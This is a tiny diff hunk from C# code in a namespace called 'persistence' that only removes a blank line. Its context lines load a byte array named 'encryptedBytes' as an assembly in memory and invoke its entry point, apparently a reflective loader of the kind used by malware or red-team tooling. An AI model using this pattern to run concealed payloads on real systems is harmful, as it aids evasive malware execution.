@@ -60,7 +60,6 @@ namespace persistence
             Assembly asm = Assembly.Load(encryptedBytes);
             asm.EntryPoint?.Invoke(null, new object[] { new string[0] });
 
-            
             Console.WriteLine("\nDone.");
             Console.ReadLine();
         }
